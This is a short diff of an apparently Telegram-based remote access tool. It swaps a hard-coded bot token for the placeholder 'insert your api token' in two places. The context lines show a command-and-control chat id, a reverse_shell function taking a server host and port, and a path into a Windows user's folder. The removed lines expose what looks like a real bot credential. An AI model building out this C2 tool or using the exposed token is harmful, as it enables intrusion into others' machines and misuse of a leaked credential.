@@ -33,7 +33,7 @@ capture = False
 base_path = 'C:\\Users\\' + local_user + '\\Saved Games\\'
 
 # -------------------------------BOT---------------------------------------
-bot = telegram.Bot(token='5824553439:AAGNAWmY2MrOZUy8WCyoMpVrWpP3fgjBx18')
+bot = telegram.Bot(token='insert your api token')
 # add chat id
 chat_id = '@C2Ctelegram'
 bot_chatid = '5824553439'
@@ -379,7 +379,7 @@ def reverse_shell(SERVER_HOST, SERVER_PORT):
 
 
 # --------------------SETTING COMMANDS FOR BOT--------------------
-updater = Updater("5824553439:AAGNAWmY2MrOZUy8WCyoMpVrWpP3fgjBx18", use_context=True)
+updater = Updater("insert your api token", use_context=True)
 dispatcher: Dispatcher = updater.dispatcher
 
 
